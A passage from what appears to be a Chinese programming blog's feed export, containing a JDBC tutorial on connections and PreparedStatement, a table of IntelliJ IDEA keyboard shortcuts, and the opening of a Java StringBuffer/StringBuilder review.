code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">driver</span>=com.mysql.jdbc.Driver<br><span class="hljs-attr">url</span>=jdbc:mysql://localhost:<span class="hljs-number">3306</span>/dr<br><span class="hljs-attr">user</span>=root<br><span class="hljs-attr">password</span>=<span class="hljs-number">333</span><br></code></pre></div></td></tr></table></figure><p>java 代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.*;<br><span class="hljs-keyword">import</span> java.sql.*;<br><span class="hljs-keyword">import</span> java.util.*;<br><br>ResourceBundle bundle = ResourceBundle.getBundle(jdbc);<br>        String driver = bundle.getString(<span class="hljs-string">&quot;driver&quot;</span>);<br>        String url = bundle.getString(<span class="hljs-string">&quot;url&quot;</span>);<br>        String user = bundle.getString(<span class="hljs-string">&quot;user&quot;</span>);<br>        String password = bundle.getString(<span class="hljs-string">&quot;password&quot;</span>);<br><br>        Connection conn = <span class="hljs-keyword">null</span>;<br>        Statement stmt = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//第一步</span><br>            Class.forName(driver);<br>            <span class="hljs-comment">//第二步</span><br>            conn = DriverManager.getConnection(url,user,password);<br>            <span class="hljs-comment">//第三步</span><br>            stmt = conn.createStatement();<br>            <span class="hljs-comment">//第四步</span><br>            String sql = <span class="hljs-string">&quot; &quot;</span>; <span class="hljs-comment">/*根据情况而定*/</span><br>            <span class="hljs-keyword">int</span> count = stmt.executeUpdate(sql);<br>        &#125; <span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span>(stmt != <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    stmt.close();<br>                &#125;<span class="hljs-keyword">catch</span> (SQLException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(conn != <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    conn.close();<br>                &#125;<span class="hljs-keyword">catch</span> (SQLException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></div></td></tr></table></figure><h2 id="3-PreparedStatement的应用"><a href="#3-PreparedStatement的应用" class="headerlink" title="3.PreparedStatement的应用"></a>3.PreparedStatement的应用</h2><blockquote><p>作用：</p></blockquote><ul><li><p>预编译SQL语句，效率高。</p></li><li><p>避免SQL注入。</p></li><li><p>可以动态填充数据，执行多个同构的SQL语句。</p></li></ul><h3 id="3-1-参数标记"><a href="#3-1-参数标记" class="headerlink" title="3.1 参数标记"></a>3.1 参数标记</h3><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">PreparedStatement pstmt <span class="hljs-operator">=</span> conn.prepareStatement(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> ? <span class="hljs-keyword">and</span> password <span class="hljs-operator">=</span> ?);<br></code></pre></div></td></tr></table></figure><ul><li>JDBC中所有参数都是由 ？ 符号占位，称为参数标记，在执行SQL语句前，必须要为每一个参数提供值。</li></ul><h3 id="3-2-动态参数绑定"><a href="#3-2-动态参数绑定" class="headerlink" title="3.2 动态参数绑定"></a>3.2 动态参数绑定</h3><blockquote><p>方法：pstmt.setXxxx(下标，值) //参数下标从1开始，为指定参数下标绑定值</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-number">1.</span>预编译 <span class="hljs-keyword">SQL</span> 语句<br>PreparedStatement pstmt <span class="hljs-operator">=</span> conn.prepareStatement(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> ? <span class="hljs-keyword">and</span> password <span class="hljs-operator">=</span> ?);<br><br><span class="hljs-number">2.</span>为参数下标赋值<br>pstmt.setString(<span class="hljs-number">1</span>,username); # 不是所有地方都是String<br>pstmt.setString(<span class="hljs-number">2</span>,password);<br></code></pre></div></td></tr></table></figure><h3 id="3-3-数据操作"><a href="#3-3-数据操作" class="headerlink" title="3.3 数据操作"></a>3.3 数据操作</h3><p>使用PreparedStatement时，还需要执行的操作。</p><ul><li><p>增删改：int cnt = <code>ps.executeUpdate();</code></p></li><li><p>查：ResultSet  rs =<code> ps.executeQuery();</code></p></li></ul><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 增删改，这里以插入数据为例</span><br>String url = <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/WeekDay?serverTimezone=GMT%2B8&quot;</span>;<br>        String user = <span class="hljs-string">&quot;root&quot;</span>;<br>        String password = <span class="hljs-string">&quot;loong461&quot;</span>;<br>        Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>        Connection connection = DriverManager.getConnection(url, user, password);<br>        <br>        String sql = <span class="hljs-string">&quot;insert into Te(id,name,money) values (?,&#x27;qqewr&#x27;,34)&quot;</span>;<br>        PreparedStatement ps = connection.prepareStatement(sql);<br>        ps.setInt(<span class="hljs-number">1</span>,<span class="hljs-number">908</span>);<br><br>        <span class="hljs-keyword">int</span> cnt = ps.executeUpdate(); <span class="hljs-comment">//重点</span><br><br>        ps.close();<br>        connection.close();<br><br><br><span class="hljs-comment">//查</span><br>只需要将<br><span class="hljs-keyword">int</span> cnt = ps.executeUpdate();<br>改为<br>ResultSet rs = ps.executeQuery();<br>即可。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IDEA快捷键</title>
    <link href="/2021/05/20/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/IDEA%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <url>/2021/05/20/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/IDEA%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    
    <content type="html"><![CDATA[<p>记录IDEA快捷键使用方法。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="1-Ctrl-键"><a href="#1-Ctrl-键" class="headerlink" title="1. Ctrl 键"></a>1. Ctrl 键</h3><table><thead><tr><th align="center">快捷键</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">Ctrl + F</td><td align="center">在当前文件进行文本查找 （必备）</td></tr><tr><td align="center">Ctrl + R</td><td align="center">在当前文件进行文本替换 （必备）</td></tr><tr><td align="center">Ctrl + Z</td><td align="center">撤销 （必备）</td></tr><tr><td align="center">Ctrl + Y</td><td align="center">删除光标所在行 或 删除选中的行 （必备）</td></tr><tr><td align="center">Ctrl + X</td><td align="center">剪切光标所在行 或 剪切选择内容</td></tr><tr><td align="center">Ctrl + C</td><td align="center">复制光标所在行 或 复制选择内容</td></tr><tr><td align="center">Ctrl + D</td><td align="center">复制光标所在行 或 复制选择内容，并把复制内容插入光标位置下面 （必备）</td></tr><tr><td align="center">Ctrl + W</td><td align="center">递进式选择代码块。可选中光标所在的单词或段落，连续按会在原有选中的基础上再扩展选中范围 （必备）</td></tr><tr><td align="center">Ctrl + E</td><td align="center">显示最近打开的文件记录列表</td></tr><tr><td align="center">Ctrl + N</td><td align="center">根据输入的 类名 查找类文件</td></tr><tr><td align="center">Ctrl + G</td><td align="center">在当前文件跳转到指定行处</td></tr><tr><td align="center">Ctrl + J</td><td align="center">插入自定义动态代码模板</td></tr><tr><td align="center">Ctrl + P</td><td align="center">方法参数提示显示</td></tr><tr><td align="center">Ctrl + Q</td><td align="center">光标所在的变量 / 类名 / 方法名等上面（也可以在提示补充的时候按），显示文档内容</td></tr><tr><td align="center">Ctrl + U</td><td align="center">前往当前光标所在的方法的父类的方法 / 接口定义</td></tr><tr><td align="center">Ctrl + B</td><td align="center">进入光标所在的方法/变量的接口或是定义出，等效于 Ctrl + 左键单击</td></tr><tr><td align="center">Ctrl + K</td><td align="center">版本控制提交项目，需要此项目有加入到版本控制才可用</td></tr><tr><td align="center">Ctrl + T</td><td align="center">版本控制更新项目，需要此项目有加入到版本控制才可用</td></tr><tr><td align="center">Ctrl + H</td><td align="center">显示当前类的层次结构</td></tr><tr><td align="center">Ctrl + O</td><td align="center">选择可重写的方法</td></tr><tr><td align="center">Ctrl + I</td><td align="center">选择可继承的方法</td></tr><tr><td align="center">Ctrl + +</td><td align="center">展开代码</td></tr><tr><td align="center">Ctrl + -</td><td align="center">折叠代码</td></tr><tr><td align="center">Ctrl + /</td><td align="center">注释光标所在行代码，会根据当前不同文件类型使用不同的注释符号 （必备）</td></tr><tr><td align="center">Ctrl + [</td><td align="center">移动光标到当前所在代码的花括号开始位置</td></tr><tr><td align="center">Ctrl + ]</td><td align="center">移动光标到当前所在代码的花括号结束位置</td></tr><tr><td align="center">Ctrl + F1</td><td align="center">在光标所在的错误代码出显示错误信息</td></tr><tr><td align="center">Ctrl + F3</td><td align="center">调转到所选中的词的下一个引用位置</td></tr><tr><td align="center">Ctrl + F4</td><td align="center">关闭当前编辑文件</td></tr><tr><td align="center">Ctrl + F8</td><td align="center">在 Debug 模式下，设置光标当前行为断点，如果当前已经是断点则去掉断点</td></tr><tr><td align="center">Ctrl + F9</td><td align="center">执行 Make Project 操作</td></tr><tr><td align="center">Ctrl + F11</td><td align="center">选中文件 / 文件夹，使用助记符设定 / 取消书签</td></tr><tr><td align="center">Ctrl + F12</td><td align="center">弹出当前文件结构层，可以在弹出的层上直接输入，进行筛选</td></tr><tr><td align="center">Ctrl + Tab</td><td align="center">编辑窗口切换，如果在切换的过程又加按上delete，则是关闭对应选中的窗口</td></tr><tr><td align="center">Ctrl + Enter</td><td align="center">智能分隔行</td></tr><tr><td align="center">Ctrl + End</td><td align="center">跳到文件尾</td></tr><tr><td align="center">Ctrl + Home</td><td align="center">跳到文件头</td></tr><tr><td align="center">Ctrl + Space</td><td align="center">基础代码补全，默认在 Windows 系统上被输入法占用，需要进行修改，建议修改为 Ctrl + 逗号 （必备）</td></tr><tr><td align="center">Ctrl + Delete</td><td align="center">删除光标后面的单词或是中文句</td></tr><tr><td align="center">Ctrl + BackSpace</td><td align="center">删除光标前面的单词或是中文句</td></tr><tr><td align="center">Ctrl + 1,2,3…9</td><td align="center">定位到对应数值的书签位置</td></tr><tr><td align="center">Ctrl + 左键单击</td><td align="center">在打开的文件标题上，弹出该文件路径</td></tr><tr><td align="center">Ctrl + 光标定位</td><td align="center">按 Ctrl 不要松开，会显示光标所在的类信息摘要</td></tr><tr><td align="center">Ctrl + 左方向键</td><td align="center">光标跳转到当前单词 / 中文句的左侧开头位置</td></tr><tr><td align="center">Ctrl + 右方向键</td><td align="center">光标跳转到当前单词 / 中文句的右侧开头位置</td></tr><tr><td align="center">Ctrl + 前方向键</td><td align="center">等效于鼠标滚轮向前效果</td></tr><tr><td align="center">Ctrl + 后方向键</td><td align="center">等效于鼠标滚轮向后效果</td></tr></tbody></table><h3 id="2-Alt-键"><a href="#2-Alt-键" class="headerlink" title="2. Alt 键"></a>2. Alt 键</h3><table><thead><tr><th align="center">快捷键</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">Alt + `</td><td align="center">显示版本控制常用操作菜单弹出层</td></tr><tr><td align="center">Alt + Q</td><td align="center">弹出一个提示，显示当前类的声明 / 上下文信息</td></tr><tr><td align="center">Alt + F1</td><td align="center">显示当前文件选择目标弹出层，弹出层中有很多目标可以进行选择</td></tr><tr><td align="center">Alt + F2</td><td align="center">对于前面页面，显示各类浏览器打开目标选择弹出层</td></tr><tr><td align="center">Alt + F3</td><td align="center">选中文本，逐个往下查找相同文本，并高亮显示</td></tr><tr><td align="center">Alt + F7</td><td align="center">查找光标所在的方法 / 变量 / 类被调用的地方</td></tr><tr><td align="center">Alt + F8</td><td align="center">在 Debug 的状态下，选中对象，弹出可输入计算表达式调试框，查看该输入内容的调试结果</td></tr><tr><td align="center">Alt + Home</td><td align="center">定位 / 显示到当前文件的 Navigation Bar</td></tr><tr><td align="center">Alt + Enter</td><td align="center">IntelliJ IDEA 根据光标所在问题，提供快速修复选择，光标放在的位置不同提示的结果也不同 （必备）</td></tr><tr><td align="center">Alt + Insert</td><td align="center">代码自动生成，如生成对象的 set / get 方法，构造函数，toString() 等</td></tr><tr><td align="center">Alt + 左方向键</td><td align="center">按左方向切换当前已打开的文件视图</td></tr><tr><td align="center">Alt + 右方向键</td><td align="center">按右方向切换当前已打开的文件视图</td></tr><tr><td align="center">Alt + 前方向键</td><td align="center">当前光标跳转到当前文件的前一个方法名位置</td></tr><tr><td align="center">Alt + 后方向键</td><td align="center">当前光标跳转到当前文件的后一个方法名位置</td></tr><tr><td align="center">Alt + 1,2,3…9</td><td align="center">显示对应数值的选项卡，其中 1 是 Project 用得最多</td></tr></tbody></table><h3 id="3-Shift-键"><a href="#3-Shift-键" class="headerlink" title="3. Shift 键"></a>3. Shift 键</h3><table><thead><tr><th align="center">快捷键</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">Shift + F1</td><td align="center">如果有外部文档可以连接外部文档</td></tr><tr><td align="center">Shift + F2</td><td align="center">跳转到上一个高亮错误 或 警告位置</td></tr><tr><td align="center">Shift + F3</td><td align="center">在查找模式下，查找匹配上一个</td></tr><tr><td align="center">Shift + F4</td><td align="center">对当前打开的文件，使用新Windows窗口打开，旧窗口保留</td></tr><tr><td align="center">Shift + F6</td><td align="center">对文件 / 文件夹 重命名</td></tr><tr><td align="center">Shift + F7</td><td align="center">在 Debug 模式下，智能步入。断点所在行上有多个方法调用，会弹出进入哪个方法</td></tr><tr><td align="center">Shift + F8</td><td align="center">在 Debug 模式下，跳出，表现出来的效果跟 F9 一样</td></tr><tr><td align="center">Shift + F9</td><td align="center">等效于点击工具栏的 Debug 按钮</td></tr><tr><td align="center">Shift + F10</td><td align="center">等效于点击工具栏的 Run 按钮</td></tr><tr><td align="center">Shift + F11</td><td align="center">弹出书签显示层</td></tr><tr><td align="center">Shift + Tab</td><td align="center">取消缩进</td></tr><tr><td align="center">Shift + ESC</td><td align="center">隐藏当前 或 最后一个激活的工具窗口</td></tr><tr><td align="center">Shift + End</td><td align="center">选中光标到当前行尾位置</td></tr><tr><td align="center">Shift + Home</td><td align="center">选中光标到当前行头位置</td></tr><tr><td align="center">Shift + Enter</td><td align="center">开始新一行。光标所在行下空出一行，光标定位到新行位置</td></tr><tr><td align="center">Shift + 左键单击</td><td align="center">在打开的文件名上按此快捷键，可以关闭当前打开文件</td></tr><tr><td align="center">Shift + 滚轮前后滚动</td><td align="center">当前文件的横向滚动轴滚动</td></tr></tbody></table><h3 id="4-Ctrl-Alt-键"><a href="#4-Ctrl-Alt-键" class="headerlink" title="4. Ctrl + Alt 键"></a>4. Ctrl + Alt 键</h3><table><thead><tr><th align="center">快捷键</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">Ctrl + Alt + L</td><td align="center">格式化代码，可以对当前文件和整个包目录使用 （必备）</td></tr><tr><td align="center">Ctrl + Alt + O</td><td align="center">优化导入的类，可以对当前文件和整个包目录使用 （必备）</td></tr><tr><td align="center">Ctrl + Alt + I</td><td align="center">光标所在行 或 选中部分进行自动代码缩进，有点类似格式化</td></tr><tr><td align="center">Ctrl + Alt + T</td><td align="center">对选中的代码弹出环绕选项弹出层</td></tr><tr><td align="center">Ctrl + Alt + J</td><td align="center">弹出模板选择窗口，讲选定的代码加入动态模板中</td></tr><tr><td align="center">Ctrl + Alt + H</td><td align="center">调用层次</td></tr><tr><td align="center">Ctrl + Alt + B</td><td align="center">在某个调用的方法名上使用会跳到具体的实现处，可以跳过接口</td></tr><tr><td align="center">Ctrl + Alt + V</td><td align="center">快速引进变量</td></tr><tr><td align="center">Ctrl + Alt + Y</td><td align="center">同步、刷新</td></tr><tr><td align="center">Ctrl + Alt + S</td><td align="center">打开 IntelliJ IDEA 系统设置</td></tr><tr><td align="center">Ctrl + Alt + F7</td><td align="center">显示使用的地方。寻找被该类或是变量被调用的地方，用弹出框的方式找出来</td></tr><tr><td align="center">Ctrl + Alt + F11</td><td align="center">切换全屏模式</td></tr><tr><td align="center">Ctrl + Alt + Enter</td><td align="center">光标所在行上空出一行，光标定位到新行</td></tr><tr><td align="center">Ctrl + Alt + Home</td><td align="center">弹出跟当前文件有关联的文件弹出层</td></tr><tr><td align="center">Ctrl + Alt + Space</td><td align="center">类名自动完成</td></tr><tr><td align="center">Ctrl + Alt + 左方向键</td><td align="center">退回到上一个操作的地方 （必备）</td></tr><tr><td align="center">Ctrl + Alt + 右方向键</td><td align="center">前进到上一个操作的地方 （必备）</td></tr><tr><td align="center">Ctrl + Alt + 前方向键</td><td align="center">在查找模式下，跳到上个查找的文件</td></tr><tr><td align="center">Ctrl + Alt + 后方向键</td><td align="center">在查找模式下，跳到下个查找的文件</td></tr></tbody></table><h3 id="5-Ctrl-Shift-键"><a href="#5-Ctrl-Shift-键" class="headerlink" title="5. Ctrl + Shift 键"></a>5. Ctrl + Shift 键</h3><table><thead><tr><th align="center">快捷键</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">Ctrl + Shift + F</td><td align="center">根据输入内容查找整个项目 或 指定目录内文件 （必备）</td></tr><tr><td align="center">Ctrl + Shift + R</td><td align="center">根据输入内容替换对应内容，范围为整个项目 或 指定目录内文件 （必备）</td></tr><tr><td align="center">Ctrl + Shift + J</td><td align="center">自动将下一行合并到当前行末尾 （必备）</td></tr><tr><td align="center">Ctrl + Shift + Z</td><td align="center">取消撤销 （必备）</td></tr><tr><td align="center">Ctrl + Shift + W</td><td align="center">递进式取消选择代码块。可选中光标所在的单词或段落，连续按会在原有选中的基础上再扩展取消选中范围 （必备）</td></tr><tr><td align="center">Ctrl + Shift + N</td><td align="center">通过文件名定位 / 打开文件 / 目录，打开目录需要在输入的内容后面多加一个正斜杠 （必备）</td></tr><tr><td align="center">Ctrl + Shift + U</td><td align="center">对选中的代码进行大 / 小写轮流转换 （必备）</td></tr><tr><td align="center">Ctrl + Shift + T</td><td align="center">对当前类生成单元测试类，如果已经存在的单元测试类则可以进行选择</td></tr><tr><td align="center">Ctrl + Shift + C</td><td align="center">复制当前文件磁盘路径到剪贴板</td></tr><tr><td align="center">Ctrl + Shift + V</td><td align="center">弹出缓存的最近拷贝的内容管理器弹出层</td></tr><tr><td align="center">Ctrl + Shift + E</td><td align="center">显示最近修改的文件列表的弹出层</td></tr><tr><td align="center">Ctrl + Shift + H</td><td align="center">显示方法层次结构</td></tr><tr><td align="center">Ctrl + Shift + B</td><td align="center">跳转到类型声明处</td></tr><tr><td align="center">Ctrl + Shift + I</td><td align="center">快速查看光标所在的方法 或 类的定义</td></tr><tr><td align="center">Ctrl + Shift + A</td><td align="center">查找动作 / 设置</td></tr><tr><td align="center">Ctrl + Shift + /</td><td align="center">代码块注释 （必备）</td></tr><tr><td align="center">Ctrl + Shift + [</td><td align="center">选中从光标所在位置到它的顶部中括号位置</td></tr><tr><td align="center">Ctrl + Shift + ]</td><td align="center">选中从光标所在位置到它的底部中括号位置</td></tr><tr><td align="center">Ctrl + Shift + +</td><td align="center">展开所有代码</td></tr><tr><td align="center">Ctrl + Shift + -</td><td align="center">折叠所有代码</td></tr><tr><td align="center">Ctrl + Shift + F7</td><td align="center">高亮显示所有该选中文本，按Esc高亮消失</td></tr><tr><td align="center">Ctrl + Shift + F8</td><td align="center">在 Debug 模式下，指定断点进入条件</td></tr><tr><td align="center">Ctrl + Shift + F9</td><td align="center">编译选中的文件 / 包 / Module</td></tr><tr><td align="center">Ctrl + Shift + F12</td><td align="center">编辑器最大化</td></tr><tr><td align="center">Ctrl + Shift + Space</td><td align="center">智能代码提示</td></tr><tr><td align="center">Ctrl + Shift + Enter</td><td align="center">自动结束代码，行末自动添加分号 （必备）</td></tr><tr><td align="center">Ctrl + Shift + Backspace</td><td align="center">退回到上次修改的地方</td></tr><tr><td align="center">Ctrl + Shift + 1,2,3…9</td><td align="center">快速添加指定数值的书签</td></tr><tr><td align="center">Ctrl + Shift + 左方向键</td><td align="center">在代码文件上，光标跳转到当前单词 / 中文句的左侧开头位置，同时选中该单词 / 中文句</td></tr><tr><td align="center">Ctrl + Shift + 右方向键</td><td align="center">在代码文件上，光标跳转到当前单词 / 中文句的右侧开头位置，同时选中该单词 / 中文句</td></tr><tr><td align="center">Ctrl + Shift + 左方向键</td><td align="center">在光标焦点是在工具选项卡上，缩小选项卡区域</td></tr><tr><td align="center">Ctrl + Shift + 右方向键</td><td align="center">在光标焦点是在工具选项卡上，扩大选项卡区域</td></tr><tr><td align="center">Ctrl + Shift + 前方向键</td><td align="center">光标放在方法名上，将方法移动到上一个方法前面，调整方法排序</td></tr><tr><td align="center">Ctrl + Shift + 后方向键</td><td align="center">光标放在方法名上，将方法移动到下一个方法前面，调整方法排序</td></tr></tbody></table><h3 id="6-Alt-Shift-键"><a href="#6-Alt-Shift-键" class="headerlink" title="6. Alt + Shift 键"></a>6. Alt + Shift 键</h3><table><thead><tr><th align="center">快捷键</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">Alt + Shift + N</td><td align="center">选择 / 添加 task</td></tr><tr><td align="center">Alt + Shift + F</td><td align="center">显示添加到收藏夹弹出层</td></tr><tr><td align="center">Alt + Shift + C</td><td align="center">查看最近操作项目的变化情况列表</td></tr><tr><td align="center">Alt + Shift + F</td><td align="center">添加到收藏夹</td></tr><tr><td align="center">Alt + Shift + I</td><td align="center">查看项目当前文件</td></tr><tr><td align="center">Alt + Shift + F7</td><td align="center">在 Debug 模式下，下一步，进入当前方法体内，如果方法体还有方法，则会进入该内嵌的方法中，依此循环进入</td></tr><tr><td align="center">Alt + Shift + F9</td><td align="center">弹出 Debug 的可选择菜单</td></tr><tr><td align="center">Alt + Shift + F10</td><td align="center">弹出 Run 的可选择菜单</td></tr><tr><td align="center">Alt + Shift + 左键双击</td><td align="center">选择被双击的单词 / 中文句，按住不放，可以同时选择其他单词 / 中文句</td></tr><tr><td align="center">Alt + Shift + 前方向键</td><td align="center">移动光标所在行向上移动</td></tr><tr><td align="center">Alt + Shift + 后方向键</td><td align="center">移动光标所在行向下移动</td></tr></tbody></table><h3 id="7-Ctrl-Shift-Alt-键"><a href="#7-Ctrl-Shift-Alt-键" class="headerlink" title="7. Ctrl + Shift + Alt 键"></a>7. Ctrl + Shift + Alt 键</h3><table><thead><tr><th align="center">快捷键</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">Ctrl + Shift + Alt + V</td><td align="center">无格式黏贴</td></tr><tr><td align="center">Ctrl + Shift + Alt + N</td><td align="center">前往指定的变量 / 方法</td></tr><tr><td align="center">Ctrl + Shift + Alt + S</td><td align="center">打开当前项目设置</td></tr><tr><td align="center">Ctrl + Shift + Alt + C</td><td align="center">复制参考信息</td></tr></tbody></table><h3 id="8-其他"><a href="#8-其他" class="headerlink" title="8. 其他"></a>8. 其他</h3><table><thead><tr><th align="center">快捷键</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">F2</td><td align="center">跳转到下一个高亮错误 或 警告位置 （必备）</td></tr><tr><td align="center">F3</td><td align="center">在查找模式下，定位到下一个匹配处</td></tr><tr><td align="center">F4</td><td align="center">编辑源</td></tr><tr><td align="center">F7</td><td align="center">在 Debug 模式下，进入下一步，如果当前行断点是一个方法，则进入当前方法体内，如果该方法体还有方法，则不会进入该内嵌的方法中</td></tr><tr><td align="center">F8</td><td align="center">在 Debug 模式下，进入下一步，如果当前行断点是一个方法，则不进入当前方法体内</td></tr><tr><td align="center">F9</td><td align="center">在 Debug 模式下，恢复程序运行，但是如果该断点下面代码还有断点则停在下一个断点上</td></tr><tr><td align="center">F11</td><td align="center">添加书签</td></tr><tr><td align="center">F12</td><td align="center">回到前一个工具窗口</td></tr><tr><td align="center">Tab</td><td align="center">缩进</td></tr><tr><td align="center">ESC</td><td align="center">从工具窗口进入代码文件窗口</td></tr><tr><td align="center">连按两次Shift</td><td align="center">弹出 Search Everywhere 弹出层</td></tr></tbody></table><hr>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习（十一）</title>
    <link href="/2021/05/19/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/19/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习（十一）。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Java-StringBuffer-和-StringBuilder-类"><a href="#1-Java-StringBuffer-和-StringBuilder-类" class="headerlink" title="1.Java StringBuffer 和 StringBuilder 类"></a>1.Java StringBuffer 和 StringBuilder 类</h2><p>StringBuffer 类是可变字符串类，创建 StringBuffer 类的对象后可以随意修改字符串的内容。每个 StringBuffer 类的对象都能够存储指定容量的字符串，如果字符串的长度超过了 StringBuffer 类对象的容量，则该对象的容量会自动扩大。</p><p>当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。和String类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。</p><p>StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（线程安全就是多线程访问时，采用了加锁机制，当一个线程访问该类的某个数据时，进行保护，其他线程不能进行访问直到该线程读取完，其他线程才可使用。不会出现数据不一致或者数据污染。线程不安全就是不提供数据访问保护，有可能出现多个线程先后更改数据造成所得到的数据是脏数据）。</p><p>由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。</p><p>StringBuffer 类支持的主要方法。</p><table><thead><tr><th align="center">方法</th><th align="center">方法描述</th></tr></thead><tbody><tr><td align="center">public StringBuffer append(String s)</td><td align="center">将指定的字符串追加到此字符序列。</td></tr><tr><td align="center">public StringBuffer reverse()</td><td align="center">将此字符序列用其反转形式取代。</td></tr><tr><td align="center">public delete(int start, int end)</td><td align="center">移除此序列的子字符串中的字符。</td></tr><tr><td align="center">public insert(int offset, int i)</td><td align="center">将 <code>int</code> 参数的字符串表示形式插入此序列中。</td></tr><tr><td align="center">replace(int start, int end, String str)</td><td align="center">使用给定 <code>String</code> 中的字符替换此序列的子字符串中的字符。</td></tr></tbody></table><h3 id="1-1-创建"><a href="#1-1-创建" class="headerlink" title="1.1 创建"></a>1.1 创建</h3><p>StringBuffer 类提供了 3 个构造方法来创建一个字符串。</p><blockquote><p>1.StringBuffer() 构造一个空的字符串缓冲区，并且初始化为 16 个字符的容量。<br>2.StringBuffer(int length) 创建一个空的字符串缓冲区，并且初始化为指定长度 length 的容量。<br>3.StringBuffer(String str) 创建一个字符串缓冲区，并将其内容初始化为指定的字符串内容 str，字符串缓冲区的初始容量为 16 加上字符串 str 的长度。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div 